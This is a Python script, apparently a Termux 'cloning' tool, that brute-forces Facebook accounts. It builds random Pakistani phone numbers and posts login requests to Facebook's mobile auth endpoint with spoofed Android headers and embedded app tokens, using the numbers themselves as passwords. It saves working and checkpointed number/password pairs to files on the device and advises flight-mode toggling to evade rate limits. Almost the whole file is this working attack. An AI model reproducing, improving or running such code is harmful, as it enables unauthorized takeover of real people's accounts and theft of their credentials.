###-------[IMPORT MODULES]-----------####

import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor

###-------[BASIC COLORS]-----------####
reset = "\033[0m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
cyan = "\033[1;36m"
white = "\033[1;37m"

###-------[FLASH COLORS]-----------####
colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]

###-------[LOOP]-----------####
loop = 0
idz = []
oks = []
cps = []

sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛YounisXyz 🙂💗 \x07')

try:os.mkdir('/sdcard/XYZ')
except:pass


###-------[LOGO]-----------####
logo= f'''\033[1;97m
     Y88b   d88P Y88b   d88P 8888888888P 
      Y88b d88P   Y88b d88P        d88P  
       Y88o88P     Y88o88P        d88P   
\033[1;32m        Y888P       Y888P        d88P
        d888b        888        d88P\033[1;97m
       d88888b       888       d88P      
      d88P Y88b      888      d88P       
     d88P   Y88b     888     d8888888888 
     
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : Muhammad Younis
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://facebook.com/xyzhackers
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/YounisXyz
 \033[1;97m[\033[1;92m•\033[1;97m] Version  : \033[1;92m0.1
\033[1;97m---------------------------------------------------
'''


###-------[CLEAR TERMINAL]-----------####
def clear():
    os.system("clear")
    print(logo)



###-------[LINE]-----------####
def linex():
    print(f"\033[1;97m--------------------------------------------------")



###-------[MSIN MENU]-----------####
def menu():
    clear()
    print(f" \033[1;97m[\033[1;92m01\033[1;97m] RANDOM NUMBER CLONING")
    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \x1b[38;5;208mVISIT YOUTUBE CHANNEL")
    print(f" \033[1;97m[\033[1;92m03\033[1;97m] \033[1;32mCONTACT DEVELOPER")
    linex()
    younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif younisxyz in ['2','02']:
        os.system("xdg-open https://youtube.com/@MRTRICKERXYZ?si=OSGhb7VAn8a_QX1C")
        time.sleep(3)
        menu()
    elif younisxyz in ['3','03']:
    	os.system("xdg-open https://www.facebook.com/xyzhackers");time.sleep(3);menu()
    else:
        print(f"\n\033[1;91m Select valid option ....")
        time.sleep(3)
        menu()


###-------[DEF CLONING]-----------####
def random_number():
    clear()
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
    linex()
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        x = "".join(random.choice(string.digits) for _ in range(7))
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        clear()
        total_idz = str(len(idz))
        print(f"\033[1;96m BRUTE HAS BEEN STARTED BE PATIENT")
        print()
        linex()
        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
        linex()
        for xyz in idz:
            uid = code+xyz
            pww = [xyz,uid] 
            XYZ.submit(crack, uid, pww, total_idz)
    linex()
    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
    menu()


###-------[METHOD CRACK]-----------####
def crack(uid, pww, total_idz):
    global loop
    global oks
    global cps
    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
    sys.stdout.write(f"\r{x}[YounisXyz] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            fb_version = str(random.randint(100,436))+".0.0."+str(random.randint(11,99))+"."+str(random.randint(100,150))
            fb_version_code = str(random.randint(111111111,999999999))
            uppercase_letter = "".join(random.choice(string.ascii_uppercase))
            three_digit = "".join(random.choice(string.digits) for _ in range(3))
            device_model = f"SM-{uppercase_letter}{three_digit}{uppercase_letter}"
            android_version = str(random.randint(8,13))
            ua = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density=3.2,width=1080,height=1920}};FBLC/en_GB;FBRV/631869122;FBCR/Zong;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{device_model});FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            sex = random.choice(["Liger", "METERED", "MOBILE.EDGE", "MOBILE.HSPA", "MOBILE.LTE", "MODERATE"])
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": uid,
                "password": pw,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_PK",
                "device": "Samsung",
                "sdk": "Android",
                "client_country_code": "PK",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
            }
            headers = {
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "X-FB-Connection-Type": sex,
                "Authorization": "OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662",
                "X-FB-Connection-Quality": sex,
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            }
            url = "https://b-graph.facebook.com/auth/login"
            po = requests.post(url, data=data, headers=headers).json()
            if "session_key" in po:
                print(f"\r\033[1;92m [XYZ-OK] {uid} | {pw}")
                open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in po["error"]["message"]:
                cpclr = random.choice(["\033[1;90m","\033[1;91m","\x1b[38;5;205m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
                print(f"\r{cpclr} [XYZ-CP] {uid} | {pw}")
                open("/sdcard/XYZ/RANDOM_CP.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except:
        pass



menu()
